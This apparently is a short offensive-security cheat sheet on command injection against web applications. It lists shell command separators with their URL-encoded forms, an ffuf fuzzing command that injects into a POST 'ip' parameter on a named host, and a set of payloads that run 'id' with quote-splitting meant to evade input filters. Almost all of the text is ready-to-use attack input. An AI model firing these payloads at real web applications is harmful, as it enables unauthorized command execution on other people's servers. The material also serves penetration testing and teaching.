Search for operations in the web app that would be using system commands to complete the task.

#### Injection methods
```shell
;     %3b
\n    %0a
&     %26
&&    %26%26 
|     %7c
||    %7c%7c
``    %60%60
$()   %24%28%29
```

```shell
ffuf -w ~/opt/wordlists/CMDi.txt -u http://adot8.com/ -X POST -d 'ip=127.0.0.1FUZZ' 
```
#### Payloads
```shell
; i"d" ; asd
& i"d" #
&& i"d"  
\n i"d" \n
\n i"d";
| i"d"
|| i"d"
`i"d"`
`/b"i"n/"i"d`
```